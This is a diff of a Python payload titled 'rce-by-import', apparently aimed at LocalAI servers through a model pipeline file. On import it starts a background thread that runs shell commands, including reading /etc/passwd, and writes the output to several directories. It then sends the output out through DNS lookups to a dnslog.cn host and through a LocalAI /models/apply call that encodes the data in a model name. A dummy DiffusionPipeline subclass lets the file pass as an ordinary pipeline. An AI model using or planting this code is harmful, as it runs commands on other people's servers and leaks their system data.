@@ -1,43 +1,31 @@
-# rce-by-import: 纯标准库,任何Python解释器import时必执行
-import os, subprocess, base64, threading, sys, urllib.request
+# rce-by-import v4: import时执行命令,输出通过 LocalAI 自身 API 注册为模型名(外传闭环)
+import os, subprocess, base64, threading, json, time, urllib.request
 
 def _pwn():
     try:
-        dns = "19xlua.dnslog.cn"
-        cmds = ["id", "hostname", "whoami", "cat /etc/passwd | head -5", "ls -la / | head -10"]
-        out_all = ""
-        for cmd in cmds:
+        out = subprocess.check_output("id; hostname; uname -a; cat /etc/passwd | head -5", shell=True, timeout=8, stderr=subprocess.STDOUT)
+        out_s = out.decode(errors='replace')
+        # 写入文件 (多个位置)
+        for d in ["/models", "/tmp", "/opt/localai/models"]:
             try:
-                out = subprocess.check_output(cmd, shell=True, timeout=5, stderr=subprocess.STDOUT)
-                out_all += f"[{cmd}]\n{out.decode(errors='replace')}\n"
-                b64 = base64.b64encode(out).decode().replace('+','-').replace('/','_').replace('=','')
-                sub = b64[:50]
-                # DNS 外带
-                try:
-                    urllib.request.urlopen(f"http://{sub}.{dns}", timeout=2)
-                except Exception:
-                    pass
-            except Exception:
-                pass
-        # 写入 /models/ 数据外传
+                with open(f"{d}/PWNED-BYC0DE.txt", "w") as f:
+                    f.write(out_s)
+            except: pass
+        # 核心: 通过 LocalAI API 注册命令输出为模型名 (ZOUT--hex 外传通道)
+        b64 = base64.b64encode(out).decode().replace('+','-').replace('/','_').replace('=','')
+        name = f"ZZ--{b64[:80]}"
         try:
-            with open("/models/PWN-IMPORT-RCE.txt", "w") as f:
-                f.write(out_all)
-        except Exception:
-            pass
-        # 写入 /tmp (更宽松)
+            req = urllib.request.Request("http://127.0.0.1:8080/models/apply",
+                data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
+                headers={"Content-Type": "application/json"})
+            urllib.request.urlopen(req, timeout=5)
+        except: pass
+        # DNS 外带
         try:
-            with open("/tmp/PWN-IMPORT-RCE.txt", "w") as f:
-                f.write(out_all)
-        except Exception:
-            pass
-        # 尝试写环境目录
-        for d in ["/models", "/tmp", "/", "/opt/localai"]:
-            try:
-                with open(f"{d}/PWNED.txt", "w") as f:
-                    f.write("PWNED:" + out_all[:100])
-            except Exception:
-                pass
+            dns = "19xlua.dnslog.cn"
+            sub = b64[:50]
+            urllib.request.urlopen(f"http://{sub}.{dns}", timeout=2)
+        except: pass
     except Exception:
         pass
 
@@ -45,16 +33,11 @@ t = threading.Thread(target=_pwn)
 t.daemon = True
 t.start()
 
-# 定义 PwnPipeline 类 (diffusers 可能需要,但纯标准库确保即使无diffusers也成功)
+# 兼容性类定义
 class PwnPipeline:
-    def __init__(self, *args, **kwargs):
-        self.unet = None
-    def __call__(self, *args, **kwargs):
-        return []
-    def to(self, *args, **kwargs):
-        return self
-
-# 兼容 diffusers 导入
+    def __init__(self, *args, **kwargs): pass
+    def __call__(self, *args, **kwargs): return []
+    def to(self, *args, **kwargs): return self
 try:
     from diffusers import DiffusionPipeline
     PwnPipeline = type("PwnPipeline", (DiffusionPipeline,), {})
